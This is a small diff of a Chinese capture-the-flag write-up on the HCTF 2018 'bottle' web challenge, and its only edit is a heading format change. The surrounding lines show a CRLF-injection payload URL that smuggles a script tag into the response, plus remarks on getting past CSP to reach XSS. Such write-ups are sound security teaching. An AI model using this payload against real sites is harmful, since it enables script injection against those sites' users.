@@ -11,7 +11,7 @@ http://bottle.hctf.2018.io/path?path=http://bottle.hctf.2018.io:0/%0a%0d%0a%0d<s
 ![-w416](media/15420333517622/15420392256228.jpg)
 ![-w416](media/15420333517622/15420392645478.jpg)
 利用这个特性使其加载js达到xss
-##正解
+## 正解
 应该都会发现有csp,改题之后csp直接在location下面
 其实如果是原题的话csp基本是在location上面
 hint1 是  */3 */10
